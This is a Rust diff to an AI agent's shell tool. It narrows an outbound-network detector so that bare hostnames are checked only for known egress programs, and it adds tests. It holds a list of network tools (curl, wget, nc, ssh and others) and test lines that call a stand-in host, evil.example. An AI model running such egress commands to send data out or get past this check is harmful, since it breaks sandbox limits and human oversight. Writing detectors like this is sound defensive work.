@@ -277,29 +277,96 @@ impl Tool for Shell {
 ///     treated as loopback, not egress.
 fn first_external_destination(command: &str) -> Option<String> {
     // 1. Scheme-prefixed URLs. The cheap-and-correct path; covers
-    //    `curl https://evil.example/foo?x=1` and friends.
+    //    `curl https://evil.example/foo?x=1` and friends. Always
+    //    checked because an `http://` URL is unambiguous regardless of
+    //    the surrounding command.
     if let Some(host) = extract_scheme_url_host(command) {
         if !is_loopback(&host) {
             return Some(host);
         }
     }
-    // 2. Bare-host CLI arguments. Walk whitespace-separated tokens,
-    //    looking for ones that look like `host.tld[:port][/...]`.
-    //    A token must contain a dot and start with an alphanumeric to
-    //    avoid lighting up on prose like `..` or `./script`.
-    for raw in command.split_whitespace() {
-        // Strip surrounding quotes / shell metachars cheaply.
-        let token = raw.trim_matches(['"', '\'', '(', ')', ';', '`']);
-        if token.is_empty() {
-            continue;
-        }
-        if let Some(host) = extract_bare_host(token) {
-            if !is_loopback(&host) {
-                return Some(host);
+    // 2. Bare-host CLI arguments. Only checked when the *command* is a
+    //    known egress utility (curl, wget, ssh, …). Walking every
+    //    whitespace token of an arbitrary command was ambiguous: file
+    //    paths like `README.md` / `cart.py` / `pkg.test` parse as
+    //    `host.tld` (alphanumeric start, single dot, alpha last
+    //    segment) and false-positived as network destinations during
+    //    the v60.17 t02 live re-probe. Defense-in-depth: the proxy
+    //    env-var fallback (`http_proxy=http://127.0.0.1:1`) still
+    //    blocks any HTTP egress from any subprocess that doesn't
+    //    appear here.
+    let cmd_name = first_command_name(command);
+    if cmd_name.map(is_known_egress_command).unwrap_or(false) {
+        for raw in command.split_whitespace() {
+            // Strip surrounding quotes / shell metachars cheaply.
+            let token = raw.trim_matches(['"', '\'', '(', ')', ';', '`']);
+            if token.is_empty() {
+                continue;
+            }
+            if let Some(host) = extract_bare_host(token) {
+                if !is_loopback(&host) {
+                    return Some(host);
+                }
             }
         }
     }
     None
+}
+
+/// Extract the first whitespace-separated token of `command`, stripping
+/// leading env-var assignments (`FOO=bar curl …`) so the egress check
+/// looks at the actual program. Returns `None` if the command is empty
+/// or consists entirely of assignments.
+fn first_command_name(command: &str) -> Option<&str> {
+    for token in command.split_whitespace() {
+        // Skip leading `KEY=value` shell assignments; they precede the
+        // real program (`FOO=1 BAR=2 curl …`).
+        if token.contains('=')
+            && token
+                .split_once('=')
+                .map(|(k, _)| {
+                    !k.is_empty() && k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
+                })
+                .unwrap_or(false)
+        {
+            continue;
+        }
+        return Some(token);
+    }
+    None
+}
+
+/// Conservative list of command-line programs whose typical use is
+/// outbound network traffic. The bare-host parser only walks command
+/// arguments when the program is one of these. Subprocesses that fetch
+/// over HTTP from inside an interpreter (`python -c "urllib.urlopen"`)
+/// are caught by the proxy env-var fallback, not by this list.
+fn is_known_egress_command(cmd: &str) -> bool {
+    // Strip a leading path so `/usr/bin/curl` and `curl` both match.
+    let basename = cmd.rsplit('/').next().unwrap_or(cmd);
+    matches!(
+        basename,
+        "curl"
+            | "wget"
+            | "nc"
+            | "ncat"
+            | "netcat"
+            | "ssh"
+            | "scp"
+            | "sftp"
+            | "rsync"
+            | "telnet"
+            | "ftp"
+            | "ping"
+            | "ping6"
+            | "host"
+            | "dig"
+            | "nslookup"
+            | "axel"
+            | "aria2"
+            | "aria2c"
+            | "lftp"
+    )
 }
 
 fn extract_scheme_url_host(s: &str) -> Option<String> {
@@ -503,6 +570,50 @@ mod tests {
     fn first_external_destination_catches_ipv4_address() {
         let dest = first_external_destination("curl http://203.0.113.1/foo").unwrap();
         assert_eq!(dest, "203.0.113.1");
+    }
+
+    #[test]
+    fn first_external_destination_ignores_filenames_with_tld_like_extensions() {
+        // Surfaced by the live t02 re-probe: the model invoked
+        //   grep -r compute_total README.md
+        //   cat cart.py
+        // and the bare-host parser flagged `README.md` and `cart.py`
+        // as hostnames (`md` and `py` are plausible 2-letter TLDs;
+        // tokens are otherwise charset-clean). DNS hostnames have no
+        // way to reliably distinguish from filename.tld without
+        // out-of-band context, so the parser now only walks bare-host
+        // tokens when the *command* is a known egress utility.
+        assert!(first_external_destination("grep -r compute_total README.md").is_none());
+        assert!(first_external_destination("cat orders/cart.py").is_none());
+        assert!(first_external_destination("rm pkg.test").is_none());
+        assert!(first_external_destination("python3 -m pytest tests/test_utils.py").is_none());
+        // The scheme-URL path stays unconditional so embedded
+        // `http(s)://…` URLs are still caught regardless of command.
+        assert_eq!(
+            first_external_destination(
+                "python3 -c \"import urllib; urllib.urlopen('https://evil.example/x')\""
+            ),
+            Some("evil.example".to_string())
+        );
+    }
+
+    #[test]
+    fn first_command_name_skips_leading_env_assignments() {
+        assert_eq!(first_command_name("FOO=1 BAR=2 curl x"), Some("curl"));
+        assert_eq!(first_command_name("curl x"), Some("curl"));
+        assert_eq!(first_command_name(""), None);
+        // Not an env assignment — leading `=foo` (no key) doesn't match.
+        assert_eq!(first_command_name("=foo bar"), Some("=foo"));
+    }
+
+    #[test]
+    fn is_known_egress_command_matches_basename_only() {
+        assert!(is_known_egress_command("curl"));
+        assert!(is_known_egress_command("/usr/bin/curl"));
+        assert!(is_known_egress_command("wget"));
+        assert!(!is_known_egress_command("python3"));
+        assert!(!is_known_egress_command("bash"));
+        assert!(!is_known_egress_command("grep"));
     }
 
     #[test]
